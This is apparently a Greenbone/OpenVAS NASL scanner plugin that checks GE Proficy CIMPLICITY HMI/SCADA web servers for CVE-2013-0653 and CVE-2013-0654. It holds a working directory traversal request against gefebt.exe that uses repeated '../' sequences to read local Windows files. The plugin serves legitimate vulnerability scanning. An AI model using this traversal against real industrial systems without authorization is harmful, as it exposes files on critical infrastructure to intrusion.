if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103785" );
	script_cve_id( "CVE-2013-0653", "CVE-2013-0654" );
	script_tag( name: "cvss_base", value: "9.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:C/I:C/A:C" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_name( "GE Intelligent Platforms Proficy Cimplicity Multiple Vulnerabilities" );
	script_xref( name: "URL", value: "http://ics-cert.us-cert.gov/advisories/ICSA-13-022-02" );
	script_xref( name: "URL", value: "http://support.ge-ip.com/support/index?page=kbchannel&id=S:KB15153" );
	script_xref( name: "URL", value: "http://support.ge-ip.com/support/index?page=kbchannel&id=S:KB15244" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2013-09-11 14:38:23 +0200 (Wed, 11 Sep 2013)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_dependencies( "gb_get_http_banner.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "CIMPLICITY/banner" );
	script_tag( name: "impact", value: "If the vulnerabilities are exploited, they could allow an unauthenticated remote
  attacker to cause the CIMPLICITY built-in Web server to crash or to run arbitrary commands on
  a server running the affected software, or could potentially allow an attacker to take control
  of the CIMPLICITY server." );
	script_tag( name: "vuldetect", value: "Send a maliciously crafted HTTP request to read a local file." );
	script_tag( name: "insight", value: "General Electric (GE) has addressed two vulnerabilities in GE Intelligent
  Platforms Proficy HMI/SCADA-CIMPLICITY: a directory transversal vulnerability and improper
  input validation vulnerability.

  GE has released two security advisories (GEIP12-13 and GEIP12-19) available on the GE
  Intelligent Platforms support Web site to inform customers about these
  vulnerabilities." );
	script_tag( name: "solution", value: "Updates are available." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "GE Intelligent Platforms Proficy Cimplicity is prone to multiple Vulnerabilities" );
	script_tag( name: "affected", value: "GE Intelligent Platforms Proficy HMI/SCADA - CIMPLICITY 4.01 through 8.0, and
  Proficy Process Systems with CIMPLICITY." );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
banner = http_get_remote_headers( port: port );
if(!ContainsString( banner, "Server: CIMPLICITY" )){
	exit( 0 );
}
files = traversal_files( "windows" );
for dir in nasl_make_list_unique( "/CimWeb", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/index.html";
	buf = http_get_cache( item: url, port: port );
	if(ContainsString( buf, "gefebt.exe" )){
		for file in keys( files ) {
			url = dir + "/gefebt.exe?substitute.bcl+FILE=" + crap( data: "../", length: 6 * 9 ) + files[file];
			if(http_vuln_check( port: port, url: url, pattern: file, check_header: TRUE )){
				report = http_report_vuln_url( port: port, url: url );
				security_message( port: port, data: report );
				exit( 0 );
			}
		}
	}
}
exit( 99 );

